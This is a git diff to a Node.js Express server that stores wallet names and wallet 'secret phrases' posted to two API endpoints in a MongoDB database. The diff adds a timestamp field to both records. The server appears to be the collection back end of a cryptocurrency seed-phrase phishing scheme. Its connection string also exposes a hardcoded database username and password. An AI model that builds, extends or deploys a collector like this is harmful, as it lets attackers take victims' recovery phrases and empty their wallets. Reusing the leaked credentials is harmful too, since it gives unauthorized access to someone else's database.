@@ -5,6 +5,8 @@ const bodyParser = require("body-parser")
 const mongoose = require("mongoose");
 const mongooseUrl = "mongodb+srv://dbBackend:clientbackend@cluster0.ycmie7z.mongodb.net/ClientBackend"
 
+let timeAdd = new Date();
+
 //Connect MONGO DB
 async function mongooseConnect(){
     try{
@@ -18,10 +20,15 @@ async function mongooseConnect(){
 mongooseConnect()
 
 //Schema
-const schema = new mongoose.Schema({secretPhrase: {type:String}});
+const schema = new mongoose.Schema(
+    {
+        Time:{type:String},
+        secretPhrase: {type:String}
+});
 const schemaUse = mongoose.model('database1', schema);
 
 const schema2 = new mongoose.Schema({
+    Time:{type:String},
     walletName: {type:String},
     secretPhrase: {type:String}
 });
@@ -39,6 +46,7 @@ server.get("/",(req,res)=>{
 server.post("/api/data1",(req,res)=>{
     async function saveSchema(){
         let data = new schemaUse({
+            Time:timeAdd,
             secretPhrase:req.body.packetData
         });
         try{
@@ -56,6 +64,7 @@ server.post("/api/data1",(req,res)=>{
 server.post("/api/data2",(req,res)=>{
     async function saveSchema(){
         let data = new schema2Use({
+            Time:timeAdd,
             walletName:req.body.walletname,
             secretPhrase:req.body.secretPhrase
         });
